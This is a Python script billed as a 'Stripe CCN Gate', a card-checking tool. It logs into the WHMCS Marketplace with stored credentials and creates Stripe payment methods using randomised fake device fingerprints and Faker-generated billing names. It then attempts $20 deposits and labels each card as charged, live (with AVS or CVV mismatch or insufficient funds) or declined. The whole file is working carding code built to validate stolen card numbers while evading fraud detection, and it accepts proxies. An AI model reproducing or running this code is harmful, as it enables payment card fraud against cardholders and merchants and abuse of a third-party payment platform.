"""
Stripe CCN Gate - Uses WHMCS Marketplace for $20 deposit validation
Based on extracted logic from ccn.py

This gate:
1. Logs into marketplace.whmcs.com with stored credentials
2. Creates a Stripe Payment Method with device fingerprinting
3. Attempts a $20 deposit intent to validate the card
"""

import os
import re
import json
import time
import random
import httpx
from typing import Tuple
from faker import Faker


WHMCS_EMAIL = os.environ.get("WHMCS_EMAIL", "")
WHMCS_PASSWORD = os.environ.get("WHMCS_PASSWORD", "")
# PK will be extracted dynamically from deposit page if not set
WHMCS_STRIPE_PK = os.environ.get("WHMCS_STRIPE_PK", "")


def gets(s: str, start: str, end: str) -> str:
    """Extract substring between start and end markers"""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return ""


def is_valid_luhn(number: str) -> bool:
    """Validate card number using Luhn algorithm"""
    number = number.replace(" ", "").replace("-", "")
    if not number.isdigit():
        return False
    total = 0
    reverse_digits = number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0


async def stripe_ccn_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                           proxy: dict = None) -> Tuple[str, bool]:
    """
    Stripe CCN check via WHMCS Marketplace $20 deposit
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    if not WHMCS_EMAIL or not WHMCS_PASSWORD:
        return ("Error: WHMCS credentials not configured (need WHMCS_EMAIL, WHMCS_PASSWORD)", False)
    
    if not is_valid_luhn(card_num):
        return ("DECLINED - Invalid card number", True)
    
    if len(card_yer) == 2:
        card_yer = "20" + card_yer
    
    fake = Faker()
    
    try:
        async with httpx.AsyncClient(timeout=40) as session:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/138.0.0.0 Safari/537.36',
            }
            
            response = await session.get('https://marketplace.whmcs.com/user/login', headers=headers)
            login_token = gets(response.text, '<input type="hidden" name="_token" value="', '"')
            
            if not login_token:
                return ("Error: Failed to get login token", False)
            
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://marketplace.whmcs.com',
                'referer': 'https://marketplace.whmcs.com/user/login',
            })
            
            login_data = {
                '_token': login_token,
                'email': WHMCS_EMAIL,
                'password': WHMCS_PASSWORD,
            }
            
            response = await session.post('https://marketplace.whmcs.com/user/login', 
                                         headers=headers, data=login_data)
            
            if 'logout' not in response.text.lower() and 'account' not in response.url.path.lower():
                return ("Error: Login failed - check credentials", False)
            
            response = await session.get('https://marketplace.whmcs.com/account/deposit', headers=headers)
            deposit_token = gets(response.text, '<input type="hidden" name="_token" value="', '"')
            
            if not deposit_token:
                return ("Error: Failed to get deposit token", False)
            
            guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
            muid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
            sid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
            
            stripe_headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/138.0.0.0 Safari/537.36',
            }
            
            pm_data = {
                'type': 'card',
                'billing_details[name]': f"{fake.first_name()} {fake.last_name()}",
                'billing_details[address][postal_code]': fake.zipcode(),
                'card[number]': card_num,
                'card[cvc]': card_cvc,
                'card[exp_month]': card_mon,
                'card[exp_year]': card_yer,
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; split-card-element',
                'referrer': 'https://marketplace.whmcs.com',
                'time_on_page': str(random.randint(30000, 120000)),
                'key': WHMCS_STRIPE_PK,
            }
            
            response = await session.post('https://api.stripe.com/v1/payment_methods', 
                                         headers=stripe_headers, data=pm_data)
            pm_json = response.json()
            
            if 'error' in pm_json:
                error_msg = pm_json['error'].get('message', 'Unknown error')
                if 'test' in error_msg.lower():
                    return ("DECLINED - Live Mode Test Card", True)
                return (f"DECLINED - {error_msg[:60]}", True)
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return ("DECLINED - Failed to create payment method", True)
            
            intent_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://marketplace.whmcs.com',
                'referer': 'https://marketplace.whmcs.com/account/deposit',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/138.0.0.0 Safari/537.36',
            }
            
            intent_data = {
                '_token': deposit_token,
                'name': fake.name(),
                'zip': fake.zipcode(),
                'promo_code_cc': '',
                'auto_top_up_threshold': '10',
                'auto_top_up_amount': '20.00',
                'amount': '20.00',
                'paymethod': pm_id,
            }
            
            response = await session.post('https://marketplace.whmcs.com/account/deposit/intent', 
                                         headers=intent_headers, data=intent_data, follow_redirects=False)
            
            result_text = response.text.lower()
            
            if response.status_code in (301, 302, 303, 307, 308):
                return ("CHARGED $20 - Redirect detected", True)
            
            if 'success' in result_text or 'payment method successfully added' in result_text:
                return ("CHARGED $20", True)
            
            error_msg = gets(response.text, '"errorMessage":"', '"')
            if error_msg:
                if 'invalid postal code or street address' in error_msg.lower():
                    return ("CCN LIVE - AVS Mismatch", True)
                if 'invalid postal code and cvv' in error_msg.lower():
                    return ("CCN LIVE - CVV Mismatch", True)
                if 'cvv' in error_msg.lower() or 'cvc' in error_msg.lower():
                    return ("CCN LIVE - CVV Issue", True)
                if 'insufficient' in error_msg.lower():
                    return ("CCN LIVE - Insufficient Funds", True)
                if 'declined' in error_msg.lower():
                    return (f"DECLINED - {error_msg[:50]}", True)
                return (f"DECLINED - {error_msg[:50]}", True)
            
            return ("DECLINED - Unknown response", True)
    
    except httpx.TimeoutException:
        return ("Error: Request timeout", False)
    except Exception as e:
        return (f"Error: {str(e)[:50]}", False)


def stripe_ccn_check_sync(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                          proxy: dict = None) -> Tuple[str, bool]:
    """Synchronous wrapper for stripe_ccn_check"""
    import asyncio
    return asyncio.run(stripe_ccn_check(card_num, card_mon, card_yer, card_cvc, proxy))


if __name__ == "__main__":
    import asyncio
    result, alive = asyncio.run(stripe_ccn_check("4000000000000002", "02", "29", "123"))
    print(f"Result: {result}, Proxy OK: {alive}")
